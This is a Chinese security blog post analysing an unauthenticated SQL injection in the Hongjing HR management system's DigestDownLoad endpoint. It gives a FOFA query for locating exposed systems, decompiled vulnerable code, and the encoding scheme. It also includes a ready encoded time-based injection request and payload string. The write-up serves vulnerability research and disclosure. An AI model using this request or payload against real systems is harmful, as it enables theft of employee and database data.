---
title: "宏景人力资源管理系统 DigestDownLoad SQL注入漏洞"
source: https://mrxn.net/jswz/hjsoft-DigestDownLoad-sqli.html
asset_dir: assets/宏景人力资源管理系统-digestdownload-sql注入漏洞
---

# 宏景人力资源管理系统 DigestDownLoad SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/6/18 08:24
* 1667浏览
* [0评论](#comment)
* 35分钟阅读

深入探索

sql

数据库

hrms


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

宏景[人力资源管理系统](#)（eHR）是一款由宏景软件研发的系统。宏景人力资源管理系统的 `DigestDownLoad` 接口处存在[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，未经过身份认证的远程攻击者可利用此漏洞执行任意SQL指令，从而窃取数据库敏感信息。

人力资源

# 影响版本

# fofa语法

> `app="HJSOFT-HCM"`

# 漏洞分析

根据 `WEB-INF/web.xml` 中对 `DigestDownLoad` 的定义如下

```
<servlet-mapping>
  <servlet-name>DigestDownLoad</servlet-name>
  <url-pattern>/servlet/DigestDownLoad</url-pattern>
</servlet-mapping>
<servlet>
  <servlet-name>DigestDownLoad</servlet-name>
  <servlet-class>com.hjsj.hrms.servlet.lawbase.DigestDownLoad</servlet-class>
</servlet>
```

跟进 `com.hjsj.hrms.servlet.lawbase.DigestDownLoad` 类

深入探索

网络安全会议

JSON处理工具

恶意软件分析工具

```
public void doGet(HttpServletRequest var1, HttpServletResponse var2) throws ServletException, IOException {
        String var3 = var1.getParameter("id");
        var3 = PubFunc.decrypt(SafeCode.decode(var3));
        String var4 = var1.getParameter("type");
        if (var4 == null) {
            var4 = "";
        }
```

首先规定请求方法为 GET ,获取的两个参数 id、type ，需要对 id 进行解码以及解密，可以使用DecryptTools工具或者[我写的](https://mrxn.net/jswz/714.html)直接编码加密即可，解码与解密方法如下

SQL注入防护

```
public static final String decode(String var0) {
    if (var0 == null) {
        return "";
    } else {
        String var1 = "";

        for(int var2 = 0; var2 < var0.length(); ++var2) {
            char var3;
            switch (var3 = var0.charAt(var2)) {
                case '^':
                    String var5 = var0.substring(var2 + 1, var2 + 4 + 1);
                    var1 = var1 + (char)Integer.parseInt(var5, 16);
                    var2 += 4;
                    break;
                case '~':
                    String var4 = var0.substring(var2 + 1, var2 + 4 - 1);
                    var1 = var1 + (char)Integer.parseInt(var4, 16);
                    var2 += 2;
                    break;
                default:
                    var1 = var1 + var3;
            }
        }

        return var1;
    }
}
```

深入探索

网络安全课程

编程语言教程

安全工具开发

```
public static String decrypt(String var0) {
        if (null == var0) {
            return "";
        } else {
            var0 = var0.replaceAll("PAATTP", "@");
            var0 = var0.replaceAll("@2HJ5@", "%");
            var0 = var0.replaceAll("@2HJB@", "\\+");
            var0 = var0.replaceAll("@2HJ0@", " ");
            var0 = var0.replaceAll("@2HJF@", "\\/");
            var0 = var0.replaceAll("@3HJF@", "\\?");
            var0 = var0.replaceAll("@2HJ3@", "#");
            var0 = var0.replaceAll("@2HJ6@", "&");
            var0 = var0.replaceAll("@3HJD@", "=");
            String var1 = SafeCode.decrypt(var0);
            return var1;
        }
    }
```

当 `var4=original` 时，执行以下处理逻辑

代码安全审计

```
var5 = var7.createStatement();
String var12 = "";
if (var4.equalsIgnoreCase("original")) {
    String var13 = "select name,digest,originalfile from law_base_file where file_id = '" + var3 + "'";
    var10.open(var7, var13);
    var6 = var5.executeQuery(var13);
} else {
    String var30 = "select name,digest,content from law_base_file where file_id = '" + var3 + "'";
    var10.open(var7, var30);
    var6 = var5.executeQuery(var30);
}
```

否则执行 else 部分，而两处的处理里对于 var3 都没有任何过滤或校验，被直接拼接进sql语句中执行，造成[SQL注入漏](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

[漏洞利用](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)使用 `1'waitfor delay'0:0:5'--` 加密编码后来测试

漏洞扫描服务

```
GET /servlet/DigestDownLoad?id=SPAATTP~32HJFPAATTPJPAATTP~32HJFPAATTPHNvno~33W~39Sm~33WBgDEqPAATTP~32HJFPAATTPWzCGPAATTP~32HJBPAATTPS~30TBXpcPpPAATTP~32HJFPAATTP~37~39l~37h~38PAATTP~33HJDPAATTP HTTP/1.1
Host: hjsoft.mrxn.net
```

[![宏景人力资源管理系统 DigestDownLoad SQL注入漏洞](images/img-001-7f29566f3001.webp)](https://image.mrxn.net/8e724abd1acf4e8bac05b8da49bc4134.webp)

成功延时 5 秒

不编码，直接使用加密后的payload也是可以的

> SPAATTP2HJFPAATTPJPAATTP2HJFPAATTPHNvno3W9Sm3WBgDEqPAATTP2HJFPAATTPWzCGPAATTP2HJBPAATTPS0TBXpcPpPAATTP2HJFPAATTP79l7h8PAATTP3HJDPAATTP

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[宏景人力资源管理系统 DigestDownLoad SQL注入漏洞](https://mrxn.net/jswz/hjsoft-DigestDownLoad-sqli.html)  
文章链接：<https://mrxn.net/jswz/hjsoft-DigestDownLoad-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

物流软件安全

![](data:image/png;base64,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)

设备上扫码阅读

网络安全


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hjsoft-DigestDownLoad-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

编程

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKi0lEQVR4AeycgXLjNgxE8+7//7n1CrcELFK07CSWp2UmyAKLBUgTYpzkpv3z9fX1z3ftn78f7vM33MDcI9zEty9Vdwu3T3NbcOKL9cK9XNxP2G/11UBu+1ufn3ICbSC3iX89Y8++gNp7VAt8AaNU29coCWx1kFh1kDxQU0/79TUA27qjJlV3xq892kAqufzrTqAbCMTkYYyzrfppgKyd6WvOtZU747tOaL18m7kRWjPCkR6ee12Qeuj90RrdQEaixb3vBNZA3nfWp1b60YFAXMv6LeDULm4i6GshOOjxVrJ9Qua87pb4+2XE/U1tb8qQ9YBTdzjqMeLuil4MfnQgL+5hlZUT+PWBjJ4kcxXLnppb83sf2J7wykNwrcHNgeCsu1FPf8J9D/V6usnJgt8ZyMnFl6w/gTWQ/kwuZbqB6DrO7NXdQlx7SKy9vCb0eQhupH/EOQ/neljv/QjNQfSAROdGqNqZjWq6gYxEi3vfCbSBQE4dHvtntwjRqz4po1rodXDPQcRAawFsb+7AkPO6TjoWAlutfBsEZ31Fa4SV3/sQPeAc1vo2kEou/7oTWAO57uyHK//R9fuuubP7QF7VEWc9pG7GOedeQoha+TYIzvoRQmiAlga2b11A+1M/JNeExfGaphx/F9cN8Yl+CE4HAvGUjPYKkQO6dH1KnHzEOW+90BywPcHibPsc4NQdAlut9TVpriLc60c5oLbpfGBbE3qsYujz04HU4g/w/xdbaAOBmFZ91X46IHJASzsnNAlsT4bjihA5oNHApodE9bNB8C6AiCHRuYquF1Zevjib4jMGsZ7rhBCc6yFiyPch6WwznXPCNhAFy64/gTWQ62dwt4PpQCCuYa2A4CCx5vc+hM5XV7jX1BhCD+Orr3pZrXnGh+w/qlNvGfQ6SE4aGQRXe0HP1bx9CJ362KYDceHC953AH7ifEkQMTHfhiQpnQuVlM03NSWsDtjd95yFiwNQQga0OaHlg49xbCME10c2B4JSf2U16+Om6KphxEGsCX+uGfH3WxxrIZ83j9RsCec0gfF9LiBjG6DOwviJkjXUQnGOha+TPzDrjSAvRH/IHCUjONZAchO9cRehzEJz3Iaw19tcN8Ul8CLa/9j67H014b8/2qHron6Bn++/1iiH61rVmPoRetTYIblZnbcWZXjmIvrVm3RCdzAfZGsgHDUNbaQOBuD4ibfUq2XcOQg+YamitsJEPHGllVQZsvzuYU95mriKEHhJrXj5kzr1GKK1tlncOsq/rKlpXOfuQtW0gTi689gTaQDzBipCTg/Br3j5EDnq0puLoJcNxLfQ5CK72tT/rP8sBLQ1stxOYci1ZHGCrLdQWA5VqvvctbANp2eVcegJrIJcef794++Nin5ozQLuGumoyV8i3mas4yo0414xy5iD3Yf1ZhKh1L6Fr5dtG3Cxn/Su4bsgrp/a45mVF+00d4mmBRD8FFb1S5SBqnIOIAVPtNgHNb8nijPpC1BRZc0f6yu39VnhznLu57RNiLUhsyYkDz+nVyutD1q4bopP5IGsD8bTq3iAnB+E7DxEDpp5GoN0WCL822e/JsRBCD4m11j5kHvKvubWHtULxMvlnDKJ/1apeBpEDWhqYvuY2kFaxnEtPYA3k0uPvF+9+7NVVs1nuWAhx5eSfMQi9e1Ws9ZW3D+dqax/5EHWQ36Lcs6K0Mkg9hC/e5hqIHCRaUxEiXzn3qJx954TrhugUPsjaj72zPUFMHPKJg+RcC8lB+H4KKo705iq6xhxET8DUQwS2N1ELIWLAVPtPELyeENjqgKarjjQyoOkg/KqzL60MQgOJ1gjXDdEpfJCtgXzQMLSVbiCQV0lXTCahDSIv3uac0bwQQg+J4mXWCxXL5Nsgahwrb4PIQY/WCPe1joUQtfJt0HPOqZ8NQufYmiOEe73qRtpuICPR4t53Aqd+7K3b0WRlEBOHRPEySK7W2ofIO64IkYP8AUI9ZVVnX7zNXMV9znHFmV45yD1B+K6H+1i8amQQOcjXAslJI1ONbd0QncgH2RrIBw1DW5kOBOJ6SWiD4HzFhGdy0tmsH6E1Quch1nRcESIHVPrQB9rvDSMRRF7rz2xUa851jo9wpJsO5KjR4n/vBNpAIJ4MSBwt66lC6syN9Oag17tOaF1FiBpzEDFg6mnUWrZZMdDdJEgOwncPiBgSvY7QOvk2SC2E3wbigoXXnkAbiKdWcba1qoOYrjmIGPLHvdoLMg/3ftW5nznHR2hdRTjuD5Gr+pEPvc57GOlHOTjuYb2wDWTU+He41XV2Amsgs9O5INcGAv2Vmu0HQg80GbC9ETbi5kDP6WrKbun2qVgGoQda7qyjehmw7QPyW6Z4GWRu1ldam3WOhRB95O/NeggN5D6cE0LmIfw2EAmWXX8C3UAgJgUMdwdsT199Kiw051horqJ4WeXguK+0MggNJIp/xuqa9kf1cG4NCN2oh/sLH+WlkXUDGRUu7n0nsAbyvrM+tdL039R1hWSjThBXFcZvWKMacxC1jitC5CBRe9hbrbEPUeO4IvQ5CA4SvU6tHXE1v/ch+u35fQyhg8R1Q/andHE8HQjE5PyEHKFfA/R6CM6aihA5yFtW17AWUgfhWwcRQ/ZwnRAib70424iD0FtzhK41QtQBRyWHvHsIpwM57PCBif/KltZAPmyS7d/UdV1kdX+KZcD2uweMsdYc+ZC1Iw1kHsK3TnvYm3OP0HXWQfQGTA3RdcKRANjOxDnp9uacEO714mwQOeD1//nM1/r4lROY/tgLMbm68v4pUFzz8iHqAIWdqUZWE4r3VvPP+LXPvq7mgO0pr5x9iBywb3EXA1uPSkJwkFjz9r2WY+F6D9EpfJCtgXzQMLSV9qauQOZrJFR8ZDC/jq5Tn72NchD9nH